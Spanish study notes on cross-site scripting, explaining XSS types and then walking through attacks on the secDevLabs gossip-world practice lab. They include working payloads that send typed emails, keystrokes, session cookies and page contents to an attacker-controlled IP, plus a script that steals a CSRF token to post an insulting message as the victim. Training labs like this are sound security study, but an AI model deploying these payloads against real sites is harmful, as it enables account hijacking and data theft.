
----
- Tags : #Cross #Scrioting #XSS #PaginasWEb #Vulnerabilidades 
-----
Una vulnerabilidad **XSS** (**Cross-Site Scripting**) es un tipo de vulnerabilidad de seguridad informática que permite a un atacante ejecutar código malicioso en la página web de un usuario sin su conocimiento o consentimiento. Esta vulnerabilidad permite al atacante robar información personal, como nombres de usuario, contraseñas y otros datos confidenciales.

En esencia, un ataque XSS implica la inserción de código malicioso en una página web vulnerable, que luego se ejecuta en el navegador del usuario que accede a dicha página. El código malicioso puede ser cualquier cosa, desde scripts que redirigen al usuario a otra página, hasta secuencias de comandos que registran pulsaciones de teclas o datos de formularios y los envían a un servidor remoto.

Existen varios tipos de vulnerabilidades XSS, incluyendo las siguientes:

> **Reflejado** (**Reflected**): Este tipo de XSS se produce cuando los datos proporcionados por el usuario **se reflejan en la respuesta** HTTP sin ser verificados adecuadamente. Esto permite a un atacante inyectar código malicioso en la respuesta, 
> que luego se ejecuta en el navegador del usuario.

 >**Almacenado** (**Stored**): Este tipo de XSS se produce cuando un atacante **es capaz de almacenar código malicioso** en una base de datos o en el servidor web que aloja una página web vulnerable. Este código se ejecuta cada vez que se carga la página.
 
 >**DOM-Based**: Este tipo de XSS se produce cuando el código malicioso **se ejecuta en el navegador del usuario a través del DOM** (Modelo de Objetos del Documento). Esto se produce cuando el código JavaScript en una página web modifica el DOM en una forma que es vulnerable a la inyección de código malicioso.

Los ataques XSS pueden tener graves consecuencias para las empresas y los usuarios individuales. Por esta razón, es esencial que los desarrolladores web implementen medidas de seguridad adecuadas para prevenir vulnerabilidades XSS. Estas medidas pueden incluir la validación de datos de entrada, la eliminación de código HTML peligroso, y la limitación de los permisos de JavaScript en el navegador del usuario.

A continuación, se proporciona el proyecto de Github correspondiente al laboratorio que nos estaremos montando para poner en práctica la vulnerabilidad XSS:

- **secDevLabs**: [https://github.com/globocom/secDevLabs](https://github.com/globocom/secDevLabs)

# Iniciamos con la practica creando nuestro laboratorio

- Primero clonamos nuestro archivo GITHUB
```
git clone https://github.com/globocom/secDevLabs
```
-  Entraremos en /home/k/a/secDevLabs/owasp-top10-202/a3/gossip-world

- Luego desplegamos nuestro docker con
```
make install
```
- Nos creamos un usuario en el localhost:10007
- Creamos archivos con barios codigos html o javascript
- Creamos un archivo <script>list("XSS")</script> en la pagina web
- Luego creamos un archivo nvim 
```
<script>
	var email = prompt("Por favor, introduce tu correo electronico para visualizar el post", "example@example.com");
	
	if (email == null || email == ""){
       alert("Es necesario introducir un correo valido para visualizar el post");
    } else {
      fetch("http://192.168.111.45/?email=" + email);
    }
</script>
```

- Nos creamos el nuevo archivo en el localhost con el script en el comentario y luego visualizamos los datos ingresados por el puerto 80
```
python3 -m http.server 80
```

- Tambien lo podemos hacer con varias opciones como, solicitar usuario y contraseña con html o crear un **Keylogger** como el siguiente ejemplo
```
nvim keylogger.js
```

```
<script>
        var k = "";
        document.onkeypress = function(e){
                e = e || window.event;
                k += e.key;
                var i = new Image();
                i.src = "http://192.168.72.130/" + k;
        };      
</script>
```
- Si nos ponemos a la escucha con python con el siguiente comando podríamos observar de mejor manera el Keylogger
```
python3 -m http.server 80 2>&1 | grep -oP 'GET /\k[^,*\s]+'
```

- Ahora podemos crear una pagina que direccione a otra pagina
```
<script>
window.location.href = "https://hack4u.io";
</script>
```

- También podemos hacer que cuando se loguee, se este logueando en otra pagina
```
var request = new XMLHttpRequest();
request.open('GET', 'http://192.168.72.130/?cookie=' + document.cookie);
request.send();
```
- Hay que ingresar el script en la creación de pagina en el localhost **"<script src="http://192.168.111.45/test.js"></script>"**
- Nos ponemos en escucha con el python3 por el puerto 80 eh ingresamos a la pagina creada con el script de arriba
- Una vez robada la cookie de sesión se podría realizar un **cookie hijacking**

# Ahora intentaremos hacer otro ejercicio de una manera mas peculiar
- Si quisiera que algún trabajador de la empresa publique de manera automática al ingresar a un post un post de odio o parecido
- Para eso lo primero que haríamos seria abrir nuestro burpsuite e ingresamos desde el localhost usando la herramienta foxyproxy
- Si queremos tramitar por POST tenemos que encontrar un CSRF token valido para incorporarlo 

- Ahora crearemos un archivo para lanzar una petición a la pagina y almacenar la respuesta en una variable 
```
nvim pwned.js
```

```
var domain = "http://localhost:10007/newgossip";
var req1 = new XMLHttpRequest();
req1.open('GET', domain, false);
req1.send();

var response = req1.responseText;
var req2 = new XMLHttpRequest();
req2.open('GET', 'http://192.168.111.45/?response=' + btoa(response));
req2.send();
```
  - Antes de esto debemos crear nuestro script en la pagina del localhost
```
<script src="http://192.168.72.130/pwned.js"></script>
```
- Entramos a la pagina creada desde el usuario test para obtener la response en **base64** y luego hacemos un 
```
echo -n "resultado" | base64 -d; echo
```
- Este comando nos permitirá encontrar el csrf token de sesion
- Una vez testiado el comando modificamos nuestro archivo para mejorar el resultado
```
var domain = "http://localhost:10007/newgossip";
var req1 = new XMLHttpRequest();
req1.open('GET', domain, false);
req1.withCredentials = true;
req1.send();

var response = req1.responseText;
var parser = new DOMParser();
var doc = parser.parseFromString(response, 'text/html');
var token = doc.getElementsByName("_csrf_token")[0].value;

var req2 = new XMLHttpRequest();
ver data = "title=Mi%20jefe%20es%20un%20cabron&subtitle=JEFE%20CABRONASO&text=Odio%20,%20cabron&_csrf_token=" + token;
req2.open('POST', 'http://localhost:10007/newgossip', false);
req2.withCredentials = true;
req2.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
req2.send(data);
```
>**Tips o datos:**
- El **prompt("Introduce tu correo, a@a.com" );** Muestra un mensaje de alerta pidiendo su correo
- La pagina https://jwt.io nos permite observar  jason wen tocken
- se debe inhabilitar la opción de "httpOnly" así podrán capturar la cookie en su servidor.